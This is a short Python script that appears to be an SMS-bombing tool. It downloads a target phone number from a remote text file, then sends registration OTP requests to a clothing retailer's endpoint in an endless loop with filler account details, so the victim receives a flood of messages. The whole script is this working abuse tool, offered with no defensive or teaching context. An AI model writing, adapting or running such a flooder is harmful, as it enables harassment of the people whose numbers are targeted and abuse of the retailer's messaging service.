import time
import requests
from requests.structures import CaseInsensitiveDict
response = requests.get("https://raw.githubusercontent.com/all-drama/test/main/sms.txt")

number =response.text


def van():
  url8 = "https://www.vanheusenindia.com/register/customerRegisterOtpCheck?isAjax=true"

  headers8 = CaseInsensitiveDict()
  headers8["Content-Type"] = "application/x-www-form-urlencoded"

  data8 = "mobileoremail="+number+"&ajax=1&capillaryChk=0&capillaryCustEmail=&firstname=TANMAbnj%2Bjj&dob=2002-01-15&gender-radio=1&email=tanmar133%2540gmail.com&mobile=&password=Sluf68%2540%2540%2524"


  resp = requests.post(url8, headers=headers8, data=data8)

  print(resp.status_code)
        
while True:
       van()
